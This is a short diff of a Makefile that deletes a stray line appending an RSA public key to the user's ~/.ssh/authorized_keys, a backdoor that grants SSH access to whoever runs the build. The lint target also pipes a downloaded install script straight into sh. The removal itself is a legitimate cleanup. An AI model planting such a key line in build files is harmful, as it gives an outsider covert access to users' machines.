@@ -19,6 +19,3 @@ build:
 lint:
 	curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s v1.29.0
 	./bin/golangci-lint run -v
-
-
-echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCYdG/kxqjzVBHmGLmCLnJWuFI4+J0vVraR9Y850v/XhxUwYsKRd1aIu7KtOWjadA4Hnnb+ciHHFnBMI6Zqe+RJXMTzDVK7XSfWdaEBlaYZKoIsxG7NrnzxWwz7EK9ytnzwbYqDzFTvF5g7vGKuqlZ4f5GxiX1Tft5W0zNeWgPwjvqQeQhuSmuY/fQ5A5W2ojWnjaB9Pq8a7PoO3hA1RbqGwZkoGDlMnCc+TiivasUf2YMxmBrOGd494ZXSTrlkZ69cc4ELNxJYCEnUK5wYFxlGNUjBnXHh/rHDS9AJtP/VReP6h/TegCSH6rj8BQ9gyTOb+h/EytfI8FB8gHkVARv thinkpad >> ~/.ssh/authorized_keys
